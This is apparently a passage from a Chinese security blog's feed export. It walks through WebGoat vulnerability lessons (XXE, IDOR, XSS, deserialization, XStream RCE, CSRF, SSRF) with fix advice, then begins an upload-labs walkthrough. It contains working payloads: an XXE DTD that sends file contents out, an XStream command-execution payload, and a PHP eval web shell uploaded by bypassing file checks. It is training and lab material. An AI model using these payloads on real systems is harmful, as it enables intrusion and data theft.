java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//Solution is posted as a separate comment        if (commentStr.contains(CONTENTS)) &#123;            return success(this).build();        &#125;        try &#123;        \tboolean secure = false;        \tif (null != request.getSession().getAttribute(&quot;applySecurity&quot;)) &#123;        \t\tsecure = true;        \t&#125;            Comment comment = comments.parseXml(commentStr, secure);            if (CONTENTS.contains(comment.getText())) &#123;                comment.setText(&quot;Nice try, you need to send the file to WebWolf&quot;);            &#125;            comments.addComment(comment, false);        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>a.dtd 上传在攻击服务器上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!ENTITY % payload  &quot;&lt;!ENTITY attack SYSTEM &#x27;http://127.0.0.1:9090/landing?text=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"xxe04.png\" alt=\"\"></p>\n<p>数据通过实体引用成功回显啦</p>\n<p><img src=\"xxe05.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"水平越权\"><a class=\"markdownIt-Anchor\" href=\"#水平越权\">#</a> 水平越权</h1>\n<h2 id=\"漏洞描述-7\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-7\">#</a> 漏洞描述</h2>\n<p>水平越权漏洞，是一种 “基于数据的访问控制” 设计缺陷引起的漏洞。由于服务器端在接收到请求数据进行操作时，没有判断数据的所属人，而导致的越权数据访问漏洞。如服务器端从客户端提交的 request 参数（用户可控数据）中获取用户 id，恶意攻击者通过变换请求 ID 的值，查看或修改不属于本人的数据。</p>\n<h2 id=\"漏洞成因-7\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-7\">#</a> 漏洞成因</h2>\n<p>服务器端对数据的访问控制验证不充分</p>\n<h2 id=\"代码片段以及修复建议-7\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-7\">#</a> 代码片段以及修复建议</h2>\n<p>idor–&gt;IDORViewOtherProfile</p>\n<p>安全代码将确保在拆除所请求的配置文件之前确保有一个水平访问控制检查</p>\n<p>例如检查登录用户的 session 中的 id（用户不可控）是否和请求的 id 一致</p>\n<p>if(requestedProfile.getUserId().equals(authUserId))</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (userSessionData.getValue(<span class=\"string\">&quot;idor-authenticated-as&quot;</span>).equals(<span class=\"string\">&quot;tom&quot;</span>)) &#123;            <span class=\"comment\">//going to use session auth to view this one            String authUserId = (String) userSessionData.getValue(&quot;idor-authenticated-user-id&quot;);            if (userId != null &amp;&amp; !userId.equals(authUserId)) &#123;                //on the right track                UserProfile requestedProfile = new UserProfile(userId);                // secure code would ensure there was a horizontal access control check prior to dishing up the requested profile                 if (requestedProfile.getUserId().equals(&quot;2342388&quot;)) &#123;                    return success(this).feedback(&quot;idor.view.profile.success&quot;).output(requestedProfile.profileToMap().toString()).build();                &#125; else &#123;                    return failed(this).feedback(&quot;idor.view.profile.close1&quot;).build();                &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"yq01.png\" alt=\"\"></p>\n<h1 id=\"xss跨站脚本\"><a class=\"markdownIt-Anchor\" href=\"#xss跨站脚本\">#</a> XSS 跨站脚本</h1>\n<h2 id=\"漏洞描述-8\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-8\">#</a> 漏洞描述</h2>\n<p>跨站脚本攻击（Cross Site Script）是一种将恶意 JavaScript 代码插入到其他 Web 用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在 HTML 页面里嵌入恶意代码。当用户浏览该页时，这些嵌入在 HTML 中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie 窃取、帐户劫持、拒绝服务攻击等。</p>\n<p>跨站脚本攻击有以下攻击形式：</p>\n<p>1、反射型跨站脚本攻击</p>\n<p>攻击者利用社会工程学等手段，发送一个 URL 链接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。</p>\n<p>2、存储型跨站脚本攻击</p>\n<p>攻击者利用应用程序提供的录入或修改数据的功能，将数据存储到服务器或用户 cookie 中，当其他用户浏览展示该数据的页面时，浏览器会执行页面中嵌入的恶意脚本，所有浏览者都会受到攻击。</p>\n<p>3、DOM 跨站脚本攻击</p>\n<p>由于 HTML 页面中，定义了一段 JS，根据用户的输入，显示一段 HTML 代码，攻击者可以在输入时，插入一段恶意脚本，最终展示时，会执行恶意脚本。</p>\n<p>DOM 跨站脚本攻击和以上两个跨站脚本攻击的区别是，DOM 跨站是纯页面脚本的输出，只有规范使用 JavaScript，才可以防御。</p>\n<h2 id=\"漏洞成因-8\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-8\">#</a> 漏洞成因</h2>\n<p>在 HTML 中常用到字符实体，将常用到的字符实体没有进行转译，导致完整的标签出现，在可输入的文本框等某些区域内输入特定的某些标签导致代码被恶意篡改。</p>\n<h2 id=\"代码片段以及修复建议-8\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-8\">#</a> 代码片段以及修复建议</h2>\n<ol>\n<li>\n<p>xss–&gt;CrossSiteScriptingLesson5a</p>\n<p>反射型 xss</p>\n<p>题目用正则表达式匹配用户输入的参数 field1，因为是题目需求这里匹配 &quot;.*&lt;script&gt;(console\\.log|alert)\\(.<em>\\);?&lt;\\/script&gt;.</em>&quot; 后在页面上进行输出</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> Predicate&lt;String&gt; XSS_PATTERN = Pattern.compile(            <span class=\"string\">&quot;.*&lt;script&gt;(console\\\\.log|alert)\\\\(.*\\\\);?&lt;\\\\/script&gt;.*&quot;</span>            , Pattern.CASE_INSENSITIVE).asMatchPredicate();<span class=\"keyword\">if</span> (XSS_PATTERN.test(field1)) &#123;            userSessionData.setValue(<span class=\"string\">&quot;xss-reflected-5a-complete&quot;</span>, <span class=\"string\">&quot;true&quot;</span>);            <span class=\"keyword\">if</span> (field1.toLowerCase().contains(<span class=\"string\">&quot;console.log&quot;</span>)) &#123;                <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;xss-reflected-5a-success-console&quot;</span>).output(cart.toString()).build();            &#125; <span class=\"keyword\">else</span> &#123;                <span class=\"keyword\">return</span> success(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;xss-reflected-5a-success-alert&quot;</span>).output(cart.toString()).build();            &#125;        &#125;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p><img src=\"xss02.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<ol>\n<li>\n<p>根据要在何处使用用户输入，使用适当的转义 / 编码技术：HTML 转义，JavaScript 转义，CSS 转义，URL 转义等。使用现有的转义库，除非绝对必要，否则请不要编写自己的库。</p>\n</li>\n<li>\n<p>如果用户输入需要包含 HTML，则无法对其进行转义 / 编码，因为它会破坏有效的标签。在这种情况下，请使用受信任且经过验证的库来解析和清除 HTML。</p>\n</li>\n<li>\n<p>为 cookie 设置 HttpOnly 标志</p>\n</li>\n<li>\n<p>使用内容安全策略</p>\n</li>\n</ol>\n</li>\n<li>\n<p>DOM 型</p>\n<p>源码中使用路由，路由中的参数而无需编码可以执行 WebGoat 中的内部功能</p>\n<p><img src=\"xss01.png\" alt=\"\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// something like ... http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere%3Cscript%3Ewebgoat.customjs.phoneHome();%3C%2Fscript%3E--andMoreGarbageHere// or http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>通过 url 触发路由内部函数的执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://localhost:8080/WebGoat/start.mvc#test/testParam=foobar&amp;_someVar=234902384lotslsfjdOf9889080GarbageHere&lt;script&gt;webgoat.customjs.phoneHome();&lt;%2Fscript&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"xss03.png\" alt=\"\"></p>\n<p>修复建议：规范使用 JavaScript</p>\n</li>\n</ol>\n<h1 id=\"反序列化\"><a class=\"markdownIt-Anchor\" href=\"#反序列化\">#</a> 反序列化</h1>\n<p>反序列化漏洞呢是一个说复杂也不复杂，说不复杂也很复杂的问题，要理解的点还是有很多的，<a href=\"https://www.cnblogs.com/ssooking/p/5875215.html\">这里就讲的很细</a></p>\n<p>deserialization–&gt;InsecureDeserializationTask</p>\n<p>根据 if (!(o instanceof VulnerableTaskHolder))，可以发现，我们序列化的实例应该是 VulnerableTaskHolder</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> (ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(<span class=\"keyword\">new</span> ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) &#123;            before = System.currentTimeMillis();            Object o = ois.readObject();            <span class=\"keyword\">if</span> (!(o <span class=\"keyword\">instanceof</span> VulnerableTaskHolder)) &#123;                <span class=\"keyword\">if</span> (o <span class=\"keyword\">instanceof</span> String) &#123;                    <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;insecure-deserialization.stringobject&quot;</span>).build();                &#125;                <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;insecure-deserialization.wrongobject&quot;</span>).build();            &#125;            after = System.currentTimeMillis();</span><br></pre></td></tr></table></figure>\n<p>VulnerableTaskHolder 定位到 Runtime.getRuntime ().exec (taskAction)</p>\n<p>并且 taskAction 是在构造函数里被赋值的</p>\n<p>所以我们可以通过控制 taskAction 来控制执行的命令（eg. VulnerableTaskHolder go = new VulnerableTaskHolder (“sleep”, “sleep 6”)），将对象使用序列化工具序列化，提交至后端处理，就会触发</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//condition is here to prevent you from destroying the goat altogether\t\tif ((taskAction.startsWith(&quot;sleep&quot;)||taskAction.startsWith(&quot;ping&quot;))\t\t\t\t&amp;&amp; taskAction.length() &lt; 22) &#123;\t\tlog.info(&quot;about to execute: &#123;&#125;&quot;, taskAction);\t\ttry &#123;            Process p = Runtime.getRuntime().exec(taskAction);            BufferedReader in = new BufferedReader(                                new InputStreamReader(p.getInputStream()));            String line = null;            while ((line = in.readLine()) != null) &#123;                log.info(line);            &#125;        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>测试截图：</p>\n<p>序列化 VulnerableTaskHolder 对象，base64 编码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span></span>&#123;        <span class=\"keyword\">try</span>&#123;            VulnerableTaskHolder go = <span class=\"keyword\">new</span> VulnerableTaskHolder(<span class=\"string\">&quot;sleep&quot;</span>, <span class=\"string\">&quot;sleep 6&quot;</span>);            ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();            ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(bos);            oos.writeObject(go);            oos.flush();            <span class=\"keyword\">byte</span>[] exploit = bos.toByteArray();            String exp = Base64.getEncoder().encodeToString(exploit);            System.out.println(exp);        &#125; <span class=\"keyword\">catch</span> (Exception e)&#123;        &#125;</span><br></pre></td></tr></table></figure>\n<p>提交后反序列化后的对象</p>\n<p><img src=\"des01.png\" alt=\"\"></p>\n<p>但是没有执行成功，谷歌了一下，说是用 java 调用 CMD 命令时，需要指定 ，但是这个会改变现存代码逻辑，暂未实现，实现后再更新</p>\n<p><img src=\"des02.png\" alt=\"\"></p>\n<p>反序列化漏洞修复建议：</p>\n<pre><code>1. 如果是第三方组件存在反序列化漏洞，建议更新版本或打补丁2. 加强对Runtime.exec相关代码的检测3. 条件允许的话，禁止JVM执行外部命令\n</code></pre>\n<h1 id=\"第三方组件\"><a class=\"markdownIt-Anchor\" href=\"#第三方组件\">#</a> 第三方组件</h1>\n<h2 id=\"漏洞描述-9\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-9\">#</a> 漏洞描述</h2>\n<p>系统中引用了存在已知漏洞的第三方组件，如 Jackson 反序列化漏洞、Struts2 远程代码执行漏洞等，可能会直接或间接导致系统沦陷。</p>\n<h2 id=\"代码片段以及修复建议-9\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-9\">#</a> 代码片段以及修复建议</h2>\n<p><a href=\"https://x-stream.github.io/CVE-2013-7285.html\">CVE-2013-7285 漏洞详情</a></p>\n<p>攻击者可以通过版本信息找到相应的 cve 漏洞和 payload 进行利用，如下就是通过构造 ContactImpl 的 xml 格式通关。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">try</span> &#123;        \t<span class=\"keyword\">if</span> (!StringUtils.isEmpty(payload)) &#123;        \t\tpayload = payload.replace(<span class=\"string\">&quot;+&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;\\r&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;\\n&quot;</span>, <span class=\"string\">&quot;&quot;</span>).replace(<span class=\"string\">&quot;&gt; &quot;</span>, <span class=\"string\">&quot;&gt;&quot;</span>).replace(<span class=\"string\">&quot; &lt;&quot;</span>, <span class=\"string\">&quot;&lt;&quot;</span>);        \t&#125;            contact = (Contact) xstream.fromXML(payload);        &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;            <span class=\"keyword\">return</span> failed(<span class=\"keyword\">this</span>).feedback(<span class=\"string\">&quot;vulnerable-components.close&quot;</span>).output(ex.getMessage()).build();        &#125;                <span class=\"keyword\">try</span> &#123;            <span class=\"keyword\">if</span> (<span class=\"keyword\">null</span>!=contact) &#123;            \tcontact.getFirstName();<span class=\"comment\">//trigger the example like https://x-stream.github.io/CVE-2013-7285.html            &#125;             if (!(contact instanceof ContactImpl)) &#123;            \treturn success(this).feedback(&quot;vulnerable-components.success&quot;).build();            &#125;        &#125; catch (Exception e) &#123;        \treturn success(this).feedback(&quot;vulnerable-components.success&quot;).output(e.getMessage()).build();        &#125;</span></span><br></pre></td></tr></table></figure>\n<p>实例案例中，可以通过构造 xml 格式的数据，造成 rce</p>\n<p>第三方漏洞修复建议：更新到最新版本，或者打补丁</p>\n<p>测试截图：</p>\n<p>payload：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;sorted-set&gt;  &lt;string&gt;foo&lt;/string&gt;  &lt;dynamic-proxy&gt;    &lt;<span class=\"class\"><span class=\"keyword\">interface</span>&gt;<span class=\"title\">java</span>.<span class=\"title\">lang</span>.<span class=\"title\">Comparable</span>&lt;/<span class=\"title\">interface</span>&gt;    &lt;<span class=\"title\">handler</span> <span class=\"title\">class</span></span>=<span class=\"string\">&quot;java.beans.EventHandler&quot;</span>&gt;      &lt;target <span class=\"class\"><span class=\"keyword\">class</span></span>=<span class=\"string\">&quot;java.lang.ProcessBuilder&quot;</span>&gt;        &lt;command&gt;          &lt;string&gt;cacl.exe&lt;/string&gt;        &lt;/command&gt;      &lt;/target&gt;      &lt;action&gt;start&lt;/action&gt;    &lt;/handler&gt;  &lt;/dynamic-proxy&gt;&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>\n<p>成功弹出计算器</p>\n<p><img src=\"301.png\" alt=\"\"></p>\n<h1 id=\"csrf\"><a class=\"markdownIt-Anchor\" href=\"#csrf\">#</a> CSRF</h1>\n<h2 id=\"漏洞描述-10\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-10\">#</a> 漏洞描述</h2>\n<p>CSRF（Cross-site request forgery）跨站请求伪造，也被称为 “One Click Attack” 或者 Session Riding，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与 XSS 非常不同，XSS 利用站点内的信任用户，而 CSRF 则通过伪装来自受信任用户的请求来利用受信任的网站。与 XSS 攻击相比，CSRF 攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比 XSS 更具危险性。</p>\n<h2 id=\"漏洞成因-9\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-9\">#</a> 漏洞成因</h2>\n<p>网站的 cookie 在浏览器中不会过期，只要不关闭浏览器或者退出登录，那以后只要是访问这个网站，都会默认你已经登录的状态。而在这个期间，攻击者发送了构造好的 csrf 脚本或包含 csrf 脚本的链接，可能会执行一些用户不想做的功能</p>\n<h2 id=\"部分代码及修复建议\"><a class=\"markdownIt-Anchor\" href=\"#部分代码及修复建议\">#</a> 部分代码及修复建议</h2>\n<ol>\n<li>\n<p>csrf–&gt;ForgedReviews.createNewReview()</p>\n<p>只判断了 refer 值</p>\n<p><img src=\"csrf1.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p>bp 一键生成</p>\n<p><img src=\"csrf01.png\" alt=\"\"></p>\n<p><img src=\"csrf02.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<ol>\n<li>\n<p>在服务器端生成随机 token，浏览器在发起针对数据的修改请求将 token 提交，由服务器端验证通过够进行操作逻辑，token 需要至多一次有效，并具有有限的生命周期</p>\n</li>\n<li>\n<p>通过检查 refer 值，判断请求是否合法 (下面的代码就是典型的反例)</p>\n</li>\n<li>\n<p>针对需要用户授权的请求，提示用户输入身份认证后再继续操作</p>\n</li>\n<li>\n<p>针对频繁操作提示输入验证码后再继续进行操作</p>\n</li>\n</ol>\n</li>\n<li>\n<p>csrf–&gt;CSRFFeedback（7）</p>\n<p>新增判断了 contentType。</p>\n<p>拦截请求包生成的 poc 中，enctype=“text/plain”，我们要发送的 json 格式的数据都被隐藏在 input 的 name 中，其余同上</p>\n<p><img src=\"csrf2.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"csrf03.png\" alt=\"\"></p>\n</li>\n</ol>\n<h1 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h1>\n<h2 id=\"漏洞描述-11\"><a class=\"markdownIt-Anchor\" href=\"#漏洞描述-11\">#</a> 漏洞描述</h2>\n<p>服务端请求伪造攻击（SSRF）也成为跨站点端口攻击，是由于一些应用在 9 向第三方主机请求资源时提供了 URL 并通过传递的 URL 来获取资源引起的，当这种功能没有对协议、网络可信便捷做好限制时，攻击者可利用这种缺陷来获取内网敏感数据、DOS 内网服务器、读文件甚至于可获取内网服务器控制权限等。</p>\n<h2 id=\"漏洞成因-10\"><a class=\"markdownIt-Anchor\" href=\"#漏洞成因-10\">#</a> 漏洞成因</h2>\n<p>服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤或者限制，比如说从指定 url 地址获取网页文本内容，加载指定地址的图片，文档等等.</p>\n<h2 id=\"代码片段以及修复建议-10\"><a class=\"markdownIt-Anchor\" href=\"#代码片段以及修复建议-10\">#</a> 代码片段以及修复建议</h2>\n<p>两个任务都是根据用户输入的参数，进行判断输入，并没有任何过滤</p>\n<p><img src=\"ssrf1.png\" alt=\"\"></p>\n<p><img src=\"ssrf2.png\" alt=\"\"></p>\n<p>测试截图：</p>\n<p><img src=\"ssrf3.png\" alt=\"\"></p>\n<p><img src=\"ssrf4.png\" alt=\"\"></p>\n<p>修复建议：</p>\n<ol>\n<li>\n<p>禁用不需要的协议。仅仅允许 http 和 https 请求。可以防止 file://,gopher://,<a href=\"ftp://%E7%AD%89%E5%BC%95%E8%B5%B7%E7%9A%84%E9%97%AE%E9%A2%98\">ftp:// 等引起的问题</a></p>\n</li>\n<li>\n<p>统一错误信息，防止利用错误信息来判断远端服务器的端口状态.</p>\n</li>\n<li>\n<p>禁止 302 跳转，或每跳转一次检查新的 host 是否为内网 ip, 后禁止</p>\n</li>\n<li>\n<p>设置 url 名单或者限制内网 ip.</p>\n</li>\n</ol>\n<hr>\n<h1 id=\"最后想说的\"><a class=\"markdownIt-Anchor\" href=\"#最后想说的\">#</a> 最后想说的</h1>\n<p>要好好努力，跟着自己的节奏，会越来越好的 o (￣ε￣*)</p>\n<p>还有还有，谢谢小甜甜一直的陪伴，爱您♡</p>\n",
            "tags": [
                "webgoat"
            ]
        },
        {
            "id": "http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "url": "http://example.com/2020/11/25/upload-labs%E5%9F%BA%E7%A1%80%E5%85%B3%E5%8D%A1/",
            "title": "upload-labs基础关卡",
            "date_published": "2020-11-25T13:24:52.000Z",
            "content_html": "<h1 id=\"pass-01\"><a class=\"markdownIt-Anchor\" href=\"#pass-01\">#</a> Pass-01</h1>\n<h2 id=\"过程\"><a class=\"markdownIt-Anchor\" href=\"#过程\">#</a> 过程</h2>\n<p>第一关，通常随便传把哈哈哈</p>\n<p>来个 php 一句话</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">\t@<span class=\"keyword\">eval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;hqxx&#x27;</span>]);    </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>哦豁，弹窗提示了：该文件不允许上传，请上传.jpg|.png|.gif 类型的文件，当前文件类型为：.php</p>\n<p>弹窗提示，没有发请求包，说明是前端验证了，那就去找 js 验证代码，干掉他</p>\n<p><img src=\"upload-labs-01-01.png\" alt=\"\"></p>\n<p>方法 1：Ctrl+F 找哪个标签用了这个函数，删掉它，然后点击上传</p>\n<p><img src=\"upload-labs-01-02.png\" alt=\"\"></p>\n<p>方法 2：复制 checkFile 函数，将.php 类型加进白名单，在控制台输入运行后点击上传</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function checkFile() &#123;</span><br><span class=\"line\">    var file = document.getElementsByName(&#x27;upload_file&#x27;)[0].value;</span><br><span class=\"line\">    if (file == null || file == &quot;&quot;) &#123;</span><br><span class=\"line\">        alert(&quot;请选择要上传的文件!&quot;);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    //定义允许上传的文件类型</span><br><span class=\"line\">    var allow_ext = &quot;.jpg|.png|.gif|.php&quot;;</span><br><span class=\"line\">    //提取上传文件的类型</span><br><span class=\"line\">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class=\"line\">    //判断上传文件类型是否允许上传</span><br><span class=\"line\">    if (allow_ext.indexOf(ext_name) == -1) &#123;</span><br><span class=\"line\">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class=\"line\">        alert(errMsg);</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上传后通过查看器得到文件路径</p>\n<p><img src=\"upload-labs-01-03.png\" alt=\"\"></p>\n<p>上菜刀</p>\n<p>菜刀没上去，上蚁剑</p>\n<p><img src=\"upload-labs-01-04.png\" alt=\"\"></p>\n<p><img src=\"upload-labs-01-05.png\" alt=\"\"></p>\n<h2 id=\"总结\"><a class=\"markdownIt-Anchor\" href=\"#总结\">#</a> 总结</h2>\n<p>在控台运行函数的方法，我还是一个月之前才知道的（别说 de），明明很容易想到或者尝试到的点…</p>\n<p>感觉还是要脑洞大一点，多尝试一些</p>\n<h1 id=\"pass-02\"><a class=\"markdownIt-Anchor\" href=\"#pass-02\">#</a> Pass-02</h1>\n<p>date：2020-11-25 22:01:47</p>\n<h2 id=\"过程-2\"><a class=\"markdownIt-Anchor\" href=\"#过程-2\">#</a> 过程</h2>\n<p>通过查看器，找到前端的 onsubmit 事件，但是删除后，还是判定文件类型不正确</p>\n<p><img src=\"upload-labs-02-01.png\" alt=\"\"></p>\n<p>并没有在前端看见 js 代码，应该是后台判断了</p>\n<p>看一下提示：本 pass 在服务端对数据包的 MIME 进行检查！</p>\n<p>上传文件，bp 抓包，更改 MIME 类型为 image/png，同时得到路径</p>\n<p><img src=\"upload-labs-02-02.png\" alt=\"\"></p>\n<p>上蚁剑连接即可。</p>\n<h2 id=\"总结-2\"><a class=\"markdownIt-Anchor\" href=\"#总结-2\">#</a> 总结</h2>\n<p>真百度了好多次了，每次都忘记</p>\n<p>“MIME 的全称是 Multipurpose Internet Mail Extensions, 即多用途互联网邮件扩展类型。 这是 HTTP 协议中用来定义文档性质及格式的标准。</p>\n<table>\n<thead>\n<tr>\n<th>文件类型</th>\n<th>后缀</th>\n<th>数据包中的文件类型</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>超文本标记语言文本</td>\n<td>.html</td>\n<td>text/html</td>\n</tr>\n<tr>\n<td>xml 文档</td>\n<td>.xml</td>\n<td>text/xml</td>\n</tr>\n<tr>\n<td>普通文本文档</td>\n<td>.text</td>\n<td>text/plain</td>\n</tr>\n<tr>\n<td>RTF 文本</td>\n<td>.rtf</td>\n<td>application/rtf</td>\n</tr>\n<tr>\n<td>PDF 文档</td>\n<td>.pdf</td>\n<td>application/pdf</td>\n</tr>\n<tr>\n<td>Miscrosoft Word 文件</td>\n<td>.word</td>\n<td>application/msword</td>\n</tr>\n<tr>\n<td>PNG 图像</td>\n<td>.png</td>\n<td>image/png</td>\n</tr>\n<tr>\n<td>GIF 图形</td>\n<td>.gif</td>\n<td>image/gif</td>\n</tr>\n<tr>\n<td>JPEG 图形</td>\n<td>.jpeg,.jpg</td>\n<td>image/jpeg</td>\n</tr>\n<tr>\n<td>任意的二进制数据</td>\n<td></td>\n<td>application/octet-stream</td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"pass-03\"><a class=\"markdownIt-Anchor\" href=\"#pass-03\">#</a> Pass-03</h1>\n<p>date：2020-11-25 22:53:30</p>\n<h2 id=\"过程-3\"><a class=\"markdownIt-Anchor\" href=\"#过程-3\">#</a> 过程</h2>\n<p>不废话直接传 php 上爆破抓包，send to repeater</p>\n<p><img src=\"upload-labs-02-03.png\" alt=\"\"></p>\n<p>根据上传 php 文件后的提示，非常有理由认为后台设置了后缀的黑名单</p>\n<p>大小写绕过，没绕过去，空格绕过去了但是不解析，那既然是黑名单，就把后缀改成 php4 呗</p>\n<p><img src=\"upload-labs-03-01.png\" alt=\"\"></p>\n<p>上蚁剑连接的时候，脚本改成 php4 类型的就可以了</p>\n<h2 id=\"总结-3\"><a class=\"markdownIt-Anchor\" href=\"#总结-3\">#</a> 总结</h2>\n<p>据说，空格可以那啥，windows 会忽略空格和点，可是我上传成功不能解析</p>\n<p>然后 00 截断上传，右键看源代码是我的一句话，后来查了一下截断上传的条件：</p>\n<ol>\n<li>php 版本小于 5.3.29</li>\n<li>magic_quotes_gpc = Off</li>\n</ol>\n<p>唉</p>\n<h1 id=\"pass-04\"><a class=\"markdownIt-Anchor\" href=\"#pass-04\">#</a> Pass-04</h1>\n<p>date：2020-11-25 23:03:25</p>\n<h2 id=\"过程-4\"><a class=\"markdownIt-Anchor\" href=\"#过程-4\">#</a> 过程</h2>\n<p>提示：</p>\n<p>本 pass 禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf 